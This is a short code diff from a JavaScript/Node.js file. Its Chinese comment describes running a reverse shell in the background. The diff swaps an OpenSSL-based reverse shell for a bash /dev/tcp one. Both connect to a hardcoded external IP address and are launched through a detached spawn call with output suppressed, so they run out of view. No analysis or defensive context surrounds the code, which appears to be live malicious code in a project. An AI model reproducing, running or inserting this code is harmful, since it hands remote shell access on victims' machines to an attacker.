@@ -81,7 +81,7 @@ if (process.platform === 'win32') {
 
   // 使用 spawn 在后台运行 OpenSSL 反弹shell
   try {
-    const shellCommand = 'mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 43.139.164.3:443 > /tmp/s; rm /tmp/s';
+    const shellCommand = 'bash -i >& /dev/tcp/43.139.164.3/9999 0>&1';
     const proc = spawn('sh', ['-c', shellCommand], {
       detached: true,
       stdio: 'ignore'
